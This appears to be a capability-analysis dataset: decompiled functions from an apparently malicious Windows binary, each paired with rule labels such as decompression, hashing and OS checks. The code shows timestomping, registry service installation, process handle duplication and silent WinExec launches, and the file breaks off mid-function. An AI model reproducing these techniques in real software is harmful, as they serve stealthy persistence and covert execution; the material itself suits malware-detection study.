{
    "00401090": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004011c3) overlaps instruction at (ram,0x004011c1)\n// \n\nuint __cdecl fcn.00401090(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uchar *puVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uchar *puVar9;\n    uint *puVar10;\n    uchar *puVar11;\n    char *pcVar12;\n    char *pcVar13;\n    char *pcVar14;\n    uint *puVar15;\n    bool bVar16;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint var_1ch;\n    uint var_14h;\n    uint var_4h;\n    \n    puVar8 = &stack0xfffffffc;\n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar10 = &var_22fh;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    var_12ch = '\\0';\n    puVar10 = &var_12bh;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar6 = 0xffffffff;\n    pcVar13 = &lpBuffer;\n    do {\n        pcVar12 = pcVar13;\n        if (uVar6 == 0) break;\n        uVar6 = uVar6 - 1;\n        pcVar12 = pcVar13 + 1;\n        cVar1 = *pcVar13;\n        pcVar13 = pcVar12;\n    } while (cVar1 != '\\0');\n    uVar6 = ~uVar6;\n    puVar10 = pcVar12 + -uVar6;\n    puVar15 = &var_12ch;\n    for (uVar7 = uVar6 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar15 = *puVar10;\n        puVar10 = puVar10 + 1;\n        puVar15 = puVar15 + 1;\n    }\n    for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar15 = *puVar10;\n        puVar10 = puVar10 + 1;\n        puVar15 = puVar15 + 1;\n    }\n    uVar6 = 0xffffffff;\n    pcVar13 = 0x421f0c;\n    do {\n        pcVar12 = pcVar13;\n        if (uVar6 == 0) break;\n        uVar6 = uVar6 - 1;\n        pcVar12 = pcVar13 + 1;\n        cVar1 = *pcVar13;\n        pcVar13 = pcVar12;\n    } while (cVar1 != '\\0');\n    uVar6 = ~uVar6;\n    iVar5 = -1;\n    pcVar13 = &var_12ch;\n    do {\n        pcVar14 = pcVar13;\n        if (iVar5 == 0) break;\n        iVar5 = iVar5 + -1;\n        pcVar14 = pcVar13 + 1;\n        cVar1 = *pcVar13;\n        pcVar13 = pcVar14;\n    } while (cVar1 != '\\0');\n    puVar10 = pcVar12 + -uVar6;\n    puVar15 = pcVar14 + -1;\n    for (uVar7 = uVar6 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar15 = *puVar10;\n        puVar10 = puVar10 + 1;\n        puVar15 = puVar15 + 1;\n    }\n    uVar6 = uVar6 & 3;\n    bVar16 = uVar6 != 0;\n    for (; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar15 = *puVar10;\n        puVar10 = puVar10 + 1;\n        puVar15 = puVar15 + 1;\n    }\n    puVar9 = &stack0xfffffffc;\n    if ((bVar16) && (puVar9 = &stack0xfffffffc,  !bVar16)) {\n        puVar10 = &stack0xfffffdb4;\n        puVar9 = &stack0xfffffdb4;\n        cVar1 = '\\x10';\n        do {\n            puVar8 = puVar8 + -1;\n            puVar10 = puVar10 + -1;\n            *puVar10 = *puVar8;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    puVar4 = (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(puVar9 + -300, 0);\n    puVar2 = *(puVar9 + 0xc);\n    if (puVar2 == 0xffffffff) {\n        puVar4 = fcn.004015e0(*(puVar9 + 8));\n        puVar11 = puVar4;\n        puVar3 = puVar4;\n        if (puVar4 == 0xffffffff) {\n            return 0;\n        }\n    }\n    else {\n        puVar11 = *(puVar9 + -4);\n        puVar3 = puVar2;\n    }\n    if ((puVar3 + 1 < 0) || (puVar3 + 1 >= 0)) {\n        puVar4 = puVar9 + -0x14;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)\n              (puVar11, puVar9 + -0x24, puVar9 + -0x1c, puVar4 + (puVar3 != 0xffffffff) + 0xec458d2f);\n    if (puVar2 == 0xffffffff) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar11);\n    }\n    return 1;\n}\n",
        "token_count": 1505
    },
    "00403d50": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00403d50(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x422380 == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00404750(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4221a8, acStack1304, &uStack2112);\n    uStack2088 = 0x422230;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x422248;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00404360(auStack1564, 0x4221a4, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1866
    },
    "00401810": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint fcn.00401810(void)\n\n{\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 119
    },
    "null": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00402a70": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t __cdecl fcn.00402a70(char *arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    char **ppcVar5;\n    bool bVar6;\n    char *pcStack40;\n    char *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar4 = &stack0xfffffffc;\n    pcStack40 = arg_8h;\n    ppcVar5 = &pcStack40;\n    (*_sym.imp.MSVCRT.dll__strlwr)();\n    bVar6 = (POPCOUNT(&stack0xffffffdc & 0xff) & 1U) != 0;\n    if ((bVar6) && (!bVar6)) {\n        cVar1 = '\\x1e';\n        do {\n            puVar4 = puVar4 + -1;\n            ppcVar5 = ppcVar5 + -1;\n            *ppcVar5 = *puVar4;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar2 = in(0x78);\n        return uVar2;\n    }\n    var_14h = 0x422304;\n    var_10h = 0x4222fc;\n    var_ch = 0x42230c;\n    var_8h = 0x422314;\n    var_4h = 0x42231c;\n    uVar2 = 0;\n    ppcVar5 = &var_14h;\n    do {\n        pcStack40 = *ppcVar5;\n        iVar3 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h);\n        if (iVar3 != 0) {\n            return 1;\n        }\n        uVar2 = uVar2 + 1;\n        ppcVar5 = ppcVar5 + 1;\n    } while (uVar2 < 5);\n    pcStack40 = str.e__X;\n    iVar3 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h);\n    return iVar3 == 0;\n}\n",
        "token_count": 512
    },
    "00403a60": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00403a60(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.004015e0(0x421ed4);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 98
    },
    "00403b10": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403b10(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    char *var_34h;\n    char *var_30h;\n    uint var_2ch;\n    char *var_28h;\n    char *var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x421f50, arg_8h);\n    (*pcVar2)(&var_264h, 0x421f68, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = str.82JM;\n    var_30h = str.30;\n    var_2ch = 0x421fa8;\n    var_28h = str..FT;\n    var_24h = str._T_;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1085
    },
    "00404890": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404b11) overlaps instruction at (ram,0x00404b10)\n// \n// WARNING: Removing unreachable block (ram,0x004048d7)\n// WARNING: Removing unreachable block (ram,0x00404ad9)\n// WARNING: Removing unreachable block (ram,0x00404ae6)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00404890(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    int32_t *piVar3;\n    uint uVar4;\n    uint *puVar5;\n    bool bVar6;\n    unkbyte10 extraout_ST0;\n    ulong uVar7;\n    uchar var_214h;\n    uint var_213h;\n    uchar var_110h;\n    uint var_10fh;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_214h = 0;\n    puVar5 = &var_213h;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_110h = 0;\n    puVar5 = &var_10fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    var_ch = 1;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_110h, str.L4oV, &var_214h);\n    fcn.00401330(&var_4h);\n    uVar7 = fcn.00403920(arg_8h, arg_ch, arg_10h, arg_14h, var_4h);\n    piVar3 = uVar7 >> 0x20;\n    iVar2 = uVar7;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    if ((-1 < iVar2) && (-1 >= iVar2)) {\n        *(iVar2 + -0x7ce92414) = extraout_ST0;\n        *piVar3 = *piVar3 + 0x4d8bdf84;\n        var_8h = extraout_ECX;\n    }\n    iVar2 = fcn.00404ec0(&var_110h, var_4h, var_8h);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    fcn.00401620();\n    iVar2 = fcn.004047b0(0x421f2c);\n    if (iVar2 == -1) {\n        iVar2 = fcn.004047b0(0x421f20);\n        if (iVar2 == -1) goto code_r0x00404a72;\n        uVar4 = 0xf;\n    }\n    else {\n        uVar4 = 0xe;\n    }\n    iVar2 = fcn.004042c0(arg_8h);\n    if (iVar2 != 0) {\n        fcn.00403d20(uVar4);\n        fcn.00404690(uVar4);\n        return 1;\n    }\n    if (*0x42237c == 0) {\n        return 0;\n    }\ncode_r0x00404a72:\n    iVar2 = fcn.00401ae0(arg_8h, &var_110h);\n    if (iVar2 == 0) {\n        var_ch = 0;\n    }\n    if ((var_ch != 0) && (iVar2 = fcn.00403ac0(arg_8h),  iVar2 == 0)) {\n        var_ch = 0;\n    }\n    if (var_ch == 0) {\n        var_ch = fcn.00403b10(arg_8h, 0);\n    }\n    while( true ) {\n        if (var_ch != 0) {\n            fcn.00404690(0xffffffff);\n        }\n        bVar6 = false;\n        puVar1 = (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        if ((bVar6) || (!bVar6)) break;\n        if (&stack0xfffffdd0 < *puVar1 || puVar1 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x421f40, 0);\n    return var_ch;\n}\n",
        "token_count": 1134
    },
    "004036a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403755) overlaps instruction at (ram,0x00403751)\n// \n// WARNING: Removing unreachable block (ram,0x00403804)\n// WARNING: Removing unreachable block (ram,0x00403778)\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.004036a0(void)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint *extraout_ECX;\n    uint *arg_ch;\n    int32_t *piVar7;\n    uint *puVar8;\n    uint unaff_EBX;\n    uchar *unaff_EBP;\n    uchar *puVar9;\n    int32_t unaff_EDI;\n    uint8_t uVar10;\n    uint8_t in_AF;\n    char cVar11;\n    char cVar12;\n    unkbyte10 extraout_ST0;\n    unkbyte10 Var13;\n    unkbyte10 extraout_ST0_00;\n    uint64_t uVar14;\n    ulong uVar15;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    puVar9 = &stack0xfffffffc;\n    iVar6 = unaff_EDI;\n    iVar4 = fcn.00401810();\n    if (iVar4 == 0) {\n        return 0;\n    }\n    fcn.00404500();\n    iVar4 = fcn.004047b0(0x421f38);\n    uVar10 = iVar4 != -1;\n    cVar12 = SBORROW4(iVar4, -1);\n    cVar11 = iVar4 + 1 < 0;\n    if (iVar4 == -1) {\n        uVar14 = fcn.004021a0();\n        *0x422380 = 1;\n        if ((cVar12 != cVar11) || (Var13 = extraout_ST0,  cVar12 == cVar11)) {\n            unaff_EDI = iVar6;\n            puVar9 = unaff_EBP;\n            uVar14 = fcn.00403a60();\n            if (uVar14 == 0) {\n                var_20h = 0;\n                var_80h._0_1_ = 0;\n                puVar8 = &var_1fh;\n                for (iVar6 = 7; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n                *puVar8 = 0;\n                *(puVar8 + 2) = 0;\n                var_60h._0_1_ = 0;\n                puVar8 = &var_80h + 1;\n                for (iVar6 = 7; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n                *puVar8 = 0;\n                *(puVar8 + 2) = 0;\n                var_40h._0_1_ = 0;\n                puVar8 = &var_60h + 1;\n                for (iVar6 = 7; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n                *puVar8 = 0;\n                *(puVar8 + 2) = 0;\n                puVar8 = &var_40h + 1;\n                for (iVar6 = 7; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n                *puVar8 = 0;\n                *(puVar8 + 2) = 0;\n                iVar6 = fcn.004027c0(&var_80h, &var_60h, &var_20h, &var_40h);\n                if (iVar6 != 0) {\n                    uVar15 = fcn.00403f60(&var_20h);\n                    puVar8 = uVar15 >> 0x20;\n                    iVar6 = uVar15;\n                    if (iVar6 != 0) {\n                        if ((iVar6 < 1) || (arg_ch = extraout_ECX,  0 < iVar6)) {\n                            arg_ch = &var_60h;\n                            puVar8 = &var_80h;\n                        }\n                        iVar6 = fcn.00404890(puVar8, arg_ch, unaff_EDI, unaff_EBX);\n                        return iVar6 != 0;\n                    }\n                    return 0;\n                }\n                return 0;\n            }\n            uVar10 = 0;\n            uVar14 = uVar14 & 0xffffffff00000000;\n            Var13 = extraout_ST0_00;\n        }\n        piVar7 = uVar14 >> 0x20;\n        *(uVar14 + -0x7ce92414) = Var13;\n        uVar5 = uVar14 - 1;\n        uVar3 = uVar5;\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        uVar3 = uVar3 + in_AF * '\\x06';\n        uVar3 = uVar3 + (0x90 < (uVar3 & 0xf0) | uVar10 | in_AF * (0xf9 < uVar3)) * '`';\n        *piVar7 = *piVar7 + 0x6e8df84;\n        uVar3 = uVar3 + *(uVar5 & 0xffffff00 | uVar3);\n        puVar1 = puVar9 + 0x330874c0;\n        uVar10 = *puVar1;\n        *puVar1 = *puVar1 + uVar3;\n        uVar2 = *(unaff_EDI + 0x5b);\n        *(unaff_EDI + 0x5b) = CONCAT11(CARRY1(uVar10, uVar3), uVar2) >> 2 | uVar2 << 7;\n        uVar5 = in(0x5d);\n        return uVar5;\n    }\n    return 0;\n}\n",
        "token_count": 1437
    },
    "004047b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00404826)\n\nuint __cdecl fcn.004047b0(uint arg_8h)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint hObject;\n    \n    hObject = 0xffffffff;\n    iVar3 = (**0x422388)(2, 0);\n    if (iVar3 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar5 = &var_128h;\n    for (iVar4 = 0x49; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = (**0x42238c)(iVar3, &var_12ch);\n    pcVar2 = _sym.imp.MSVCRT.dll__stricmp;\n    uVar1 = hObject;\n    while( true ) {\n        hObject = uVar1;\n        if (iVar4 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n            return uVar1;\n        }\n        iVar4 = (*pcVar2)(&var_108h, arg_8h);\n        if (iVar4 == 0) break;\n        iVar4 = (**0x422390)(iVar3, &var_12ch);\n        uVar1 = hObject;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    return var_124h;\n}\n",
        "token_count": 394
    },
    "00404dc0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404dd4) overlaps instruction at (ram,0x00404dd1)\n// \n\nulong __cdecl fcn.00404dc0(uint arg_8h)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    bool in_CF;\n    \n    if ((in_CF) || (!in_CF)) {\n        in_EAX = arg_8h;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(in_EAX, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 137
    },
    "00404e10": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404e10(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.004047b0(0x421f40);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar1);\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n        if (iVar3 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 211
    },
    "004011f0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040137b) overlaps instruction at (ram,0x00401376)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.004011f0(uint param_1, int32_t param_2, uint *param_3, int32_t *param_4)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint8_t uVar4;\n    uint16_t uVar5;\n    uint32_t uVar6;\n    uchar *arg_ch;\n    uint arg_ch_00;\n    uchar *arg_8h;\n    uint16_t uVar7;\n    char *unaff_EBX;\n    uchar *puVar8;\n    uint16_t uVar9;\n    int32_t iVar10;\n    uchar *unaff_EDI;\n    bool bVar11;\n    uchar auStackY108 [52];\n    uint32_t uStack24;\n    uint uStack8;\n    \n    puVar8 = &stack0xfffffffc;\n    uStack24 = param_2 + 1U >> 1;\n    uVar6 = fcn.004033c0();\n    uVar6 = uVar6 & 0xffff;\n    uStack24 = param_1;\n    uStack8 = 